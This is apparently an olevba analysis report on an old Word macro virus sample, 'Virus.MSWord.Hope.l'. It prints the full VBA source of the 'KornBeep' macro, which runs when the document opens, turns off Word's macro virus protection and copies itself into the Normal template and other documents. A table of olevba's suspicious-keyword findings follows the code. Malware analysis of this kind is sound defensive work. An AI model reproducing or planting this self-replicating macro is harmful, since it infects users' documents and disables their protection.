olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hope.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hope.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen()
Options.VirusProtection = 0
Set k = MacroContainer
Set o = NormalTemplate
If o = k Then Set o = ActiveDocument
Set r = o.VBProject.vbcomponents.Item(1).codemodule
n = r.countoflines
If n <> 9 Then: r.deletelines 1, n: r.addfromstring k.VBProject.vbcomponents.Item(1).codemodule.lines(1, 9): Beep
End Sub
' KornBeep v1.2 12:06pm june 10 1999
' By =9 of SkamWerks! http://pegasus.cc.ucf.edu/~kes65601


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://pegasus.cc.uc|URL                                          |
|          |f.edu/~kes65601     |                                             |
+----------+--------------------+---------------------------------------------+

